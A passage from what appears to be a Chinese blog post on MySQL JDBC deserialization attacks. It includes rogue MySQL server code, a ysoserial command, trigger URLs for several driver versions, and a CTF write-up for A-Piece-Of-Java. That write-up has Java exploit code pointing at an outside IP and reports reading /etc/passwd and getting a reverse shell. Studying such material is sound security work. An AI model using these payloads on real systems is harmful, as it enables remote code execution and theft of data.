+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;session.auto_increment_increment&#34;</span> <span style="color:#f92672">in</span> data:
+</span></span><span style="display:flex;"><span>                _payload<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;01000001132e00000203646566000000186175746f5f696e6372656d656e745f696e6372656d656e74000c3f001500000008a0000000002a00000303646566000000146368617261637465725f7365745f636c69656e74000c21000c000000fd00001f00002e00000403646566000000186368617261637465725f7365745f636f6e6e656374696f6e000c21000c000000fd00001f00002b00000503646566000000156368617261637465725f7365745f726573756c7473000c21000c000000fd00001f00002a00000603646566000000146368617261637465725f7365745f736572766572000c210012000000fd00001f0000260000070364656600000010636f6c6c6174696f6e5f736572766572000c210033000000fd00001f000022000008036465660000000c696e69745f636f6e6e656374000c210000000000fd00001f0000290000090364656600000013696e7465726163746976655f74696d656f7574000c3f001500000008a0000000001d00000a03646566000000076c6963656e7365000c210009000000fd00001f00002c00000b03646566000000166c6f7765725f636173655f7461626c655f6e616d6573000c3f001500000008a0000000002800000c03646566000000126d61785f616c6c6f7765645f7061636b6574000c3f001500000008a0000000002700000d03646566000000116e65745f77726974655f74696d656f7574000c3f001500000008a0000000002600000e036465660000001071756572795f63616368655f73697a65000c3f001500000008a0000000002600000f036465660000001071756572795f63616368655f74797065000c210009000000fd00001f00001e000010036465660000000873716c5f6d6f6465000c21009b010000fd00001f000026000011036465660000001073797374656d5f74696d655f7a6f6e65000c21001b000000fd00001f00001f000012036465660000000974696d655f7a6f6e65000c210012000000fd00001f00002b00001303646566000000157472616e73616374696f6e5f69736f6c6174696f6e000c21002d000000fd00001f000022000014036465660000000c776169745f74696d656f7574000c3f001500000008a000000000020100150131047574663804757466380475746638066c6174696e31116c6174696e315f737765646973685f6369000532383830300347504c013107343139343330340236300731303438353736034f4646894f4e4c595f46554c4c5f47524f55505f42592c5354524943545f5452414e535f5441424c45532c4e4f5f5a45524f5f494e5f444154452c4e4f5f5a45524f5f444154452c4552524f525f464f525f4449564953494f4e5f42595f5a45524f2c4e4f5f4155544f5f4352454154455f555345522c4e4f5f454e47494e455f535542535449545554494f4e0cd6d0b9fab1ead7bccab1bce4062b30383a30300f52455045415441424c452d5245414405323838303007000016fe000002000000&#39;</span>
+</span></span><span style="display:flex;"><span>                send_data(conn,_payload)
+</span></span><span style="display:flex;"><span>                data<span style="color:#f92672">=</span>receive_data(conn)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">elif</span> <span style="color:#e6db74">&#34;show warnings&#34;</span> <span style="color:#f92672">in</span> data:
+</span></span><span style="display:flex;"><span>                _payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f000059000005075761726e696e6704313238374b27404071756572795f63616368655f73697a6527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e59000006075761726e696e6704313238374b27404071756572795f63616368655f7479706527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e07000007fe000002000000&#39;</span>
+</span></span><span style="display:flex;"><span>                send_data(conn, _payload)
+</span></span><span style="display:flex;"><span>                data <span style="color:#f92672">=</span> receive_data(conn)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;set names&#34;</span> <span style="color:#f92672">in</span> data:
+</span></span><span style="display:flex;"><span>                send_data(conn, response_ok_data)
+</span></span><span style="display:flex;"><span>                data <span style="color:#f92672">=</span> receive_data(conn)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;set character_set_results&#34;</span> <span style="color:#f92672">in</span> data:
+</span></span><span style="display:flex;"><span>                send_data(conn, response_ok_data)
+</span></span><span style="display:flex;"><span>                data <span style="color:#f92672">=</span> receive_data(conn)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;show session status&#34;</span> <span style="color:#f92672">in</span> data:
+</span></span><span style="display:flex;"><span>                mysql_data <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;0100000102&#39;</span>
+</span></span><span style="display:flex;"><span>                mysql_data <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;1a000002036465660001630163016301630c3f00ffff0000fc9000000000&#39;</span>
+</span></span><span style="display:flex;"><span>                mysql_data <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;1a000003036465660001630163016301630c3f00ffff0000fc9000000000&#39;</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#75715e"># 为什么我加了EOF Packet 就无法正常运行呢？？</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#75715e">#获取payload</span>
+</span></span><span style="display:flex;"><span>                payload_content<span style="color:#f92672">=</span>get_payload_content()
+</span></span><span style="display:flex;"><span>                <span style="color:#75715e">#计算payload长度</span>
+</span></span><span style="display:flex;"><span>                payload_length <span style="color:#f92672">=</span> str(hex(len(payload_content)<span style="color:#f92672">//</span><span style="color:#ae81ff">2</span>))<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;0x&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">.</span>zfill(<span style="color:#ae81ff">4</span>)
+</span></span><span style="display:flex;"><span>                payload_length_hex <span style="color:#f92672">=</span> payload_length[<span style="color:#ae81ff">2</span>:<span style="color:#ae81ff">4</span>] <span style="color:#f92672">+</span> payload_length[<span style="color:#ae81ff">0</span>:<span style="color:#ae81ff">2</span>]
+</span></span><span style="display:flex;"><span>                <span style="color:#75715e">#计算数据包长度</span>
+</span></span><span style="display:flex;"><span>                data_len <span style="color:#f92672">=</span> str(hex(len(payload_content)<span style="color:#f92672">//</span><span style="color:#ae81ff">2</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span>))<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;0x&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">.</span>zfill(<span style="color:#ae81ff">6</span>)
+</span></span><span style="display:flex;"><span>                data_len_hex <span style="color:#f92672">=</span> data_len[<span style="color:#ae81ff">4</span>:<span style="color:#ae81ff">6</span>] <span style="color:#f92672">+</span> data_len[<span style="color:#ae81ff">2</span>:<span style="color:#ae81ff">4</span>] <span style="color:#f92672">+</span> data_len[<span style="color:#ae81ff">0</span>:<span style="color:#ae81ff">2</span>]
+</span></span><span style="display:flex;"><span>                mysql_data <span style="color:#f92672">+=</span> data_len_hex <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;04&#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;fbfc&#39;</span><span style="color:#f92672">+</span> payload_length_hex
+</span></span><span style="display:flex;"><span>                mysql_data <span style="color:#f92672">+=</span> str(payload_content)
+</span></span><span style="display:flex;"><span>                mysql_data <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;07000005fe000022000100&#39;</span>
+</span></span><span style="display:flex;"><span>                send_data(conn, mysql_data)
+</span></span><span style="display:flex;"><span>                data <span style="color:#f92672">=</span> receive_data(conn)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;show warnings&#34;</span> <span style="color:#f92672">in</span> data:
+</span></span><span style="display:flex;"><span>                payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f00006d000005044e6f74650431313035625175657279202753484f572053455353494f4e20535441545553272072657772697474656e20746f202773656c6563742069642c6f626a2066726f6d2063657368692e6f626a73272062792061207175657279207265777269746520706c7567696e07000006fe000002000000&#39;</span>
+</span></span><span style="display:flex;"><span>                send_data(conn, payload)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
+</span></span><span style="display:flex;"><span>    HOST <span style="color:#f92672">=</span><span style="color:#e6db74">&#39;0.0.0.0&#39;</span>
+</span></span><span style="display:flex;"><span>    PORT <span style="color:#f92672">=</span> <span style="color:#ae81ff">3309</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    sk <span style="color:#f92672">=</span> socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET, socket<span style="color:#f92672">.</span>SOCK_STREAM)
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">#当socket关闭后，本地端用于该socket的端口号立刻就可以被重用.为了实验的时候不用等待很长时间</span>
+</span></span><span style="display:flex;"><span>    sk<span style="color:#f92672">.</span>setsockopt(socket<span style="color:#f92672">.</span>SOL_SOCKET, socket<span style="color:#f92672">.</span>SO_REUSEADDR, <span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>    sk<span style="color:#f92672">.</span>bind((HOST, PORT))
+</span></span><span style="display:flex;"><span>    sk<span style="color:#f92672">.</span>listen(<span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;start fake mysql server listening on </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">:</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(HOST,PORT))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    run()
+</span></span></code></pre></div><p>用yso构造个弹计算器的payload文件</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>java -jar ysoserial.jar CommonsCollections5 <span style="color:#e6db74">&#34;powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc YwBhAGwAYwAuAGUAeABlAA==&#34;</span> &gt; payload
+</span></span></code></pre></div><p>执行py文件即可构造恶意mysql服务。</p>
+<p>或者使用fake-mysql-gui工具直接</p>
+<!-- raw HTML omitted -->
+<p>主要是修改这里的mysql，后面的参数根据不同的版本对应有不同的链子</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="mysql_jdbc_%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96.assets/image-20250419154808958.png"
+        data-srcset="mysql_jdbc_%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96.assets/image-20250419154808958.png, mysql_jdbc_%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96.assets/image-20250419154808958.png 1.5x, mysql_jdbc_%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96.assets/image-20250419154808958.png 2x"
+        data-sizes="auto"
+        alt="mysql_jdbc_反序列化.assets/image-20250419154808958.png"
+        title="image-20250419154808958" /></p>
+<p>如果没问题执行后就会弹计算器。 其中具体流程，如何从mysql连接跟进到readobject()反序列化，暂且略过。</p>
+<p>不同版本对应的链子如下</p>
+<p>以<code>ServerStatusDiffInterceptor</code>为触发点</p>
+<p><strong>8.x</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>jdbc:mysql://xxx.xxx.xxx.xxx:3306/test?autoDeserialize=true&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor
+</span></span></code></pre></div><p><strong>6.x</strong></p>
+<p>属性名不同，queryInterceptors更改为statementInterceptors</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>jdbc:mysql://xxx.xxx.xxx.xxx:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor
+</span></span></code></pre></div><p><strong>&gt;=5.1.11</strong></p>
+<p>jar包中没有cj</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>jdbc:mysql://xxx.xxx.xxx.xxx:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor
+</span></span></code></pre></div><p><strong>5.x &lt;= 5.1.10</strong></p>
+<p>同5.1.11的payload，但需要连接后执行查询。</p>
+<p>以<code>detectCustomCollations</code>为触发点</p>
+<p><strong>5.1.29 - 5.1.40</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>jdbc:mysql://xxx.xxx.xxx.xxx:3306/test?detectCustomCollations=true&amp;autoDeserialize=true
+</span></span></code></pre></div><p>5.1.28 - 5.1.19</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>jdbc:mysql://xxx.xxx.xxx.xxx:3306/test?autoDeserialize=true
+</span></span></code></pre></div><h1 id="羊城杯-2020a-piece-of-java">[羊城杯-2020]A-Piece-Of-Java</h1>
+<p>对mysql-jdbc-反序列化 有个浅浅的认知后，来看一个相关考点的ctf题目</p>
+<p>idea反编译打开jar包，看一下控制器的主要逻辑</p>
+<!-- raw HTML omitted -->
+<p>cookie的生成逻辑是userinfo的序列化数据</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="mysql_jdbc_%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96.assets/image-20250419162541609.png"
+        data-srcset="mysql_jdbc_%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96.assets/image-20250419162541609.png, mysql_jdbc_%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96.assets/image-20250419162541609.png 1.5x, mysql_jdbc_%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96.assets/image-20250419162541609.png 2x"
+        data-sizes="auto"
+        alt="mysql_jdbc_反序列化.assets/image-20250419162541609.png"
+        title="image-20250419162541609" /></p>
+<p>hello路由下，对cookie进行了反序列化</p>
+<p>看一下 deserialize函数具体做了什么</p>
+<!-- raw HTML omitted -->
+<p>有个SerialKiller限制了反序列化，它是反序列化类白/黑名单校验的jar包</p>
+<p>打开serialkiller.conf查看</p>
+<!-- raw HTML omitted -->
+<p>有个白名单，限制使用gdufs和java.lang。这里只允许反序列化gduf和java.lang下的类，也就是说直接反序列化行不通</p>
+<p>继续看/hello路由，后面有</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (info <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span>) {
+</span></span><span style="display:flex;"><span>                model.<span style="color:#a6e22e">addAttribute</span>(<span style="color:#e6db74">&#34;info&#34;</span>, info.<span style="color:#a6e22e">getAllInfo</span>());
+</span></span><span style="display:flex;"><span>            }
+</span></span></code></pre></div><p>把反序列化后的cookie赋给info，这里info是一个接口，可以选择两种实现类</p>
+<!-- raw HTML omitted -->
+<p>源码中存在InfoInvocationHandler类，其含有invoke方法，且继承了InvocationHandler接口</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="mysql_jdbc_%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96.assets/image-20250419200358978.png"
+        data-srcset="mysql_jdbc_%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96.assets/image-20250419200358978.png, mysql_jdbc_%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96.assets/image-20250419200358978.png 1.5x, mysql_jdbc_%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96.assets/image-20250419200358978.png 2x"
+        data-sizes="auto"
+        alt="mysql_jdbc_反序列化.assets/image-20250419200358978.png"
+        title="image-20250419200358978" /></p>
+<p>需要联想到动态代理，<code>invoke</code>方法在动态代理当中会自动执行，执行后会调用<code>checkAllInfo()</code>，</p>
+<p>而该方法中又调用了connection()方法，触发jdbc</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="mysql_jdbc_%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96.assets/image-20250419201849588.png"
+        data-srcset="mysql_jdbc_%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96.assets/image-20250419201849588.png, mysql_jdbc_%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96.assets/image-20250419201849588.png 1.5x, mysql_jdbc_%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96.assets/image-20250419201849588.png 2x"
+        data-sizes="auto"
+        alt="mysql_jdbc_反序列化.assets/image-20250419201849588.png"
+        title="image-20250419201849588" /></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>        String url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;jdbc:mysql://&#34;</span> <span style="color:#f92672">+</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">host</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;:&#34;</span> <span style="color:#f92672">+</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">port</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;/jdbc?user=&#34;</span> <span style="color:#f92672">+</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">username</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;&amp;password=&#34;</span> <span style="color:#f92672">+</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">password</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;&amp;connectTimeout=3000&amp;socketTimeout=6000&#34;</span>;
+</span></span></code></pre></div><p>这里可以构造参数值实现jdbc attack，因为是单纯的参数拼接</p>
+<p>pom里面 有8.0.19的mysql ，也符合jdbc反序列化的版本</p>
+<!-- raw HTML omitted -->
+<p>接下来就是要把整个链路串起来，从cookie调用到connect</p>
+<p>链路大概为</p>
+<pre tabindex="0"><code>            Info info = (Info)this.deserialize(cookieData);
+            if (info != null) {
+                model.addAttribute(&#34;info&#34;, info.getAllInfo());
+            }
+            入口
+
+Info.getAllInfo()
+  --&gt;InfoInvocationHandler.invoke
+    --&gt;DatabaseInfo.checkAllInfo
+      --&gt;DatabaseInfo.connect()
+</code></pre><p>先构造好可以触发connect()的cookie：</p>
+<p>exp:</p>
+<p>jd-gui把反编译的源码先保存出来</p>
+<p>编写动态代理类 被代理对象是 <code>DatabaseInfo</code>类。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#f92672">package</span> gdufs.challenge.web;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> gdufs.challenge.web.invocation.InfoInvocationHandler;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> gdufs.challenge.web.model.DatabaseInfo;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> gdufs.challenge.web.model.Info;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.ByteArrayOutputStream;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.IOException;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.ObjectOutputStream;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.lang.reflect.Proxy;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.util.Base64;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Exp</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>(String<span style="color:#f92672">[]</span> args) <span style="color:#66d9ef">throws</span> IOException {
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">//设置好DatabaseInfo类的相关属性以实现jdbc反序列化</span>
+</span></span><span style="display:flex;"><span>        DatabaseInfo databaseInfo <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> DatabaseInfo();
+</span></span><span style="display:flex;"><span>        databaseInfo.<span style="color:#a6e22e">setHost</span>(<span style="color:#e6db74">&#34;60.204.224.124&#34;</span>);
+</span></span><span style="display:flex;"><span>        databaseInfo.<span style="color:#a6e22e">setPort</span>(<span style="color:#e6db74">&#34;3307&#34;</span>);
+</span></span><span style="display:flex;"><span>        databaseInfo.<span style="color:#a6e22e">setUsername</span>(<span style="color:#e6db74">&#34;thnpkm&#34;</span>);
+</span></span><span style="display:flex;"><span>        databaseInfo.<span style="color:#a6e22e">setPassword</span>(<span style="color:#e6db74">&#34;thnpkm&amp;allowLoadLocalInfile=true&amp;autoDeserialize=true&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">//将DataBaseInfo实例，封装进Proxy类 使用动态代理</span>
+</span></span><span style="display:flex;"><span>        ClassLoader classLoader <span style="color:#f92672">=</span> databaseInfo.<span style="color:#a6e22e">getClass</span>().<span style="color:#a6e22e">getClassLoader</span>();
+</span></span><span style="display:flex;"><span>        Class<span style="color:#f92672">[]</span> interfaces <span style="color:#f92672">=</span> databaseInfo.<span style="color:#a6e22e">getClass</span>().<span style="color:#a6e22e">getInterfaces</span>();
+</span></span><span style="display:flex;"><span>        InfoInvocationHandler infoInvocationHandler <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> InfoInvocationHandler(databaseInfo);
+</span></span><span style="display:flex;"><span>        Info proxy <span style="color:#f92672">=</span> (Info) Proxy.<span style="color:#a6e22e">newProxyInstance</span>(classLoader,interfaces,infoInvocationHandler);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        ByteArrayOutputStream baos <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ByteArrayOutputStream();
+</span></span><span style="display:flex;"><span>        ObjectOutputStream oos <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ObjectOutputStream(baos);
+</span></span><span style="display:flex;"><span>        oos.<span style="color:#a6e22e">writeObject</span>(proxy);
+</span></span><span style="display:flex;"><span>        oos.<span style="color:#a6e22e">flush</span>();
+</span></span><span style="display:flex;"><span>        oos.<span style="color:#a6e22e">close</span>();
+</span></span><span style="display:flex;"><span>        System.<span style="color:#a6e22e">out</span>.<span style="color:#a6e22e">println</span>(<span style="color:#66d9ef">new</span> String(Base64.<span style="color:#a6e22e">getEncoder</span>().<span style="color:#a6e22e">encode</span>(baos.<span style="color:#a6e22e">toByteArray</span>())));
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>这样就能构造出cookie</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="mysql_jdbc_%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96.assets/image-20250419214228663.png"
+        data-srcset="mysql_jdbc_%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96.assets/image-20250419214228663.png, mysql_jdbc_%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96.assets/image-20250419214228663.png 1.5x, mysql_jdbc_%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96.assets/image-20250419214228663.png 2x"
+        data-sizes="auto"
+        alt="mysql_jdbc_反序列化.assets/image-20250419214228663.png"
+        title="image-20250419214228663" /></p>
+<p>rogue_mysql_server 构造恶意mysql服务</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="mysql_jdbc_%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96.assets/image-20250420004629417.png"
+        data-srcset="mysql_jdbc_%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96.assets/image-20250420004629417.png, mysql_jdbc_%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96.assets/image-20250420004629417.png 1.5x, mysql_jdbc_%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96.assets/image-20250420004629417.png 2x"
+        data-sizes="auto"
+        alt="mysql_jdbc_反序列化.assets/image-20250420004629417.png"
+        title="image-20250420004629417" /></p>
+<p>成功读取到/etc/passwd</p>
+<p>那就尝试ysoserial反弹shell</p>
+<p>config.yaml如下配置</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="mysql_jdbc_%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96.assets/image-20250420005309740.png"
+        data-srcset="mysql_jdbc_%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96.assets/image-20250420005309740.png, mysql_jdbc_%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96.assets/image-20250420005309740.png 1.5x, mysql_jdbc_%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96.assets/image-20250420005309740.png 2x"
+        data-sizes="auto"
+        alt="mysql_jdbc_反序列化.assets/image-20250420005309740.png"
+        title="image-20250420005309740" /></p>
+<p>启动服务，然后cookie发送请求</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="mysql_jdbc_%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96.assets/image-20250420004902959.png"
+        data-srcset="mysql_jdbc_%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96.assets/image-20250420004902959.png, mysql_jdbc_%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96.assets/image-20250420004902959.png 1.5x, mysql_jdbc_%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96.assets/image-20250420004902959.png 2x"
+        data-sizes="auto"
+        alt="mysql_jdbc_反序列化.assets/image-20250420004902959.png"
+        title="image-20250420004902959" /></p>
+<p>成功监听到回连shell 拿到flag</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="mysql_jdbc_%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96.assets/image-20250420004819767.png"
+        data-srcset="mysql_jdbc_%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96.assets/image-20250420004819767.png, mysql_jdbc_%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96.assets/image-20250420004819767.png 1.5x, mysql_jdbc_%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96.assets/image-20250420004819767.png 2x"
+        data-sizes="auto"
+        alt="mysql_jdbc_反序列化.assets/image-20250420004819767.png"
+        title="image-20250420004819767" /></p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2025-04-21</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://thnpkm.github.io/posts/java%E5%AE%89%E5%85%A8/mysql_jdbc_%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" data-title="mysql_jdbc_反序列化" data-hashtags="java"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://thnpkm.github.io/posts/java%E5%AE%89%E5%85%A8/mysql_jdbc_%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" data-hashtag="java"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="https://thnpkm.github.io/posts/java%E5%AE%89%E5%85%A8/mysql_jdbc_%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" data-title="mysql_jdbc_反序列化"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="https://thnpkm.github.io/posts/java%E5%AE%89%E5%85%A8/mysql_jdbc_%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" data-title="mysql_jdbc_反序列化"><i data-svg-src="https://cdn.jsdelivr.net/npm/simple-icons@6.20.0/icons/line.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://thnpkm.github.io/posts/java%E5%AE%89%E5%85%A8/mysql_jdbc_%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" data-title="mysql_jdbc_反序列化"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/java/">Java</a></section>
+        <section>
